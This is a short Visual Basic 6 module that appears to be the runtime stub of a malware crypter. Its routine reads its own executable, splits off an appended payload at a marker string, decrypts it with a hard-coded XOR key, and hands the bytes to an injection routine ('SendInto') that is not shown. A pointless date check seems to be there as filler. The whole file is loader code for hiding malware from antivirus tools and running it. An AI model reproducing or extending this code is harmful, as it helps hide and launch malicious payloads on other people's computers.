Attribute VB_Name = "mTWO"

Public Sub Langlauf()


Dim Zwarr() As Byte
Dim MeinFile As String
MeinFile = App.Path & "\" & App.EXEName & ".exe"

Dim Zinhalt As String

Dim test As String
test = Date
If test = Date Then
Open MeinFile For Binary As #1
Zinhalt = Space(LOF(1))
Get #1, , Zinhalt
Close #1
Else
End If


Dim files() As String
files = Split(Zinhalt, "³³X³³")


Dim stub As String
stub = files(0)
Dim crypted As String
crypted = files(1)

Dim options() As String
options = Split(files(0), "~²~")


        crypted = VernamCode(crypted, "0x00923232")
        Zwarr() = StrConv(crypted, vbFromUnicode)

        SendInto MeinFile, Zwarr()


End Sub

